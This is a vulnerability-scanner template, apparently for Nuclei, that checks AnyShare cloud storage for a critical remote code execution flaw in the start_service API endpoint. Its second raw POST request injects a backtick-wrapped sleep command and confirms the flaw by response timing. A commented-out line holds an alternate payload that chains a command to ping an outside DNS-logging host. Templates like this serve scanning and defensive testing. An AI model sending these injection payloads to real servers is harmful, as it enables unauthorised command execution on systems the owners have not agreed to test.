id: AnyShare-start-service-rce

info:
  name: 爱数AnyShare爱数云盘start_service远程代码执行漏洞
  author: AnyShare
  severity: critical
  tags: AnyShare

http:
  - raw:
      - |
        POST /api/ServiceAgent/start_service HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Connection: close
        Accept-Encoding: gzip, deflate, br

        [""]

      - |
        POST /api/ServiceAgent/start_service HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Connection: close
        Accept-Encoding: gzip, deflate, br

        ["`sleep 4`"]

    max-redirects: 3
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      
      - type: dsl
        dsl:
          - 'duration_2 >= 4'
          - 'duration_1 < 2'
          - 'duration_2 < 10'
          - 'len(body) < 6'
        condition: and
      - type: word
        part: body
        words:
          - "null"
#["ccc;ping 43c564dd8a.ddns.1433.eu.org."]